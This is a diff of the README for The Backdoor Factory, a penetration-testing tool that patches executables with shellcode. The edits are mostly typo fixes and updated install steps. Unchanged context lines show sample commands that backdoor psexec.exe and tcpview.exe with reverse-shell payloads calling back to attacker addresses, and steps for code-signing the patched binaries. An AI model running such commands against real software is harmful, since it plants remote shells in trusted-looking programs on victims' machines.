@@ -1,7 +1,4 @@
 
-## The new version of BACKDOOR FACTORY is available! Get access here: https://github.com/sponsors/secretsquirrel
-
-
 ## The Backdoor Factory (BDF)
 
 For security professionals and researchers only.
@@ -63,21 +60,22 @@ docker run -it secretsquirrel/the-backdoor-factory bash
 
 ###OLD SCHOOL
 
-####Dependences
+####Dependencies
 #####*To use OnionDuke you MUST be on an intel machine because aPLib has no support for the ARM chipset yet.*
 
 
-[Capstone engine](http://www.capstone-engine.org) can be installed from PyPi with:
-
-    sudo pip install capstone
-
-Pefile, most recent:
+osslsigncode: 
     
-    https://code.google.com/p/pefile/
+on their official GitHub, the BUILD STATUS is (CL failling): https://github.com/mtrojnar/osslsigncode#build-status
 
-osslsigncode (included in repo): 
-    
-    http://sourceforge.net/p/osslsigncode/osslsigncode/ci/master/tree/
+cloning and compiling won't work at all (I tried, no luck ;) ), so it's better to download the Release Version from here: https://github.com/mtrojnar/osslsigncode/releases for your supported platform and run these commands in the downloaded folder
+
+for installing on Ubuntu, Debian, or alike Linux users:
+      unzip osslsigncode-*.zip && cp osslsigncode-*/bin/osslsigncode /bin
+
+for installing on macOS:
+     unzip osslsigncode-*.zip && cp osslsigncode-*/bin/osslsigncode /bin && cp osslsigncode-*/share/bash-completion/osslsigncode /share/bash-completion
+
 
 Kali Install:
 
@@ -89,7 +87,7 @@ Other *NIX/MAC INSTALL:
 
     ./install.sh
 
-This will install Capstone with 3.01 pip to install pefile.
+This will install and downgrade Capstone to the supported commit.
 
 UPDATE:
 
@@ -108,7 +106,7 @@ Supporting:
     Experimental: OpenBSD x32 
 
 
-Some executables have built in protections, as such this will not work on all binaries.  It is advisable that you test target binaries before deploying them to clients or using them in exercises.  I'm on the verge of bypassing NSIS, so bypassing these checks will be included in the future.
+Some executables have built-in protections, as such this will not work on all binaries.  It would be best for you to test target binaries before deploying them to clients or using them in exercises.  I'm on the verge of bypassing NSIS, so bypassing these checks will be included in the future.
 
     Many thanks to Ryan O'Neill --ryan 'at' codeslum <d ot> org--
     Without him, I would still be trying to do stupid things 
@@ -119,7 +117,7 @@ Some executables have built in protections, as such this will not work on all bi
 
 
 
-Recently tested on many binaries.
+It was recently tested on many binaries.
 ---
 
 ./backdoor.py -h 
@@ -159,7 +157,7 @@ Recently tested on many binaries.
       -Provide custom shellcode.
       -Patch a directory of executables/dlls.
       -Select x32 or x64 binaries to patch only.
-      -Include BDF is other python projects see pebin.py and elfbin.py
+      -Include BDF in other python projects see pebin.py and elfbin.py
 
 ---------------------------------------------
 
@@ -171,7 +169,7 @@ Sample Usage:
     ./backdoor.py -f psexec.exe -H 192.168.0.100 -P 8080 -s reverse_shell_tcp 
 
     [*] In the backdoor module
-    [*] Checking if binary is supported
+    [*] Checking if the binary is supported
     [*] Gathering file info
     [*] Reading win32 entry instructions
     [*] Looking for and setting selected shellcode
@@ -253,7 +251,7 @@ Name your certs EXACTLY as follows:
     signingCert.cer => certs/signingCert.cer
     signingPrivateKey.pem => certs/signingPrivateKey.pem
 
-Your certs/ directory should look excatly as so:
+Your certs/ directory should look exactly as so:
     
     certs
     ├── passFile.txt
@@ -265,7 +263,7 @@ Enable PE Code Signing with the -C flag as so:
      ./backdoor.py -f tcpview.exe -s iat_reverse_tcp_inline -H 172.16.186.1 -P 8080 -m automatic -C
 
 
-On successful run you should see this line in BDF output:
+On the successful run, you should see this line in BDF output:
 
     [*] Code Signing Succeeded
 
@@ -284,7 +282,7 @@ On successful run you should see this line in BDF output:
 
 ####01/11/2016
 
-* Fix entry point truncation bug that led to improper recovery in rare instances
+* Fix entry point truncation bug that led to an improper recovery in rare instances
 
 
 ####07/04/2016
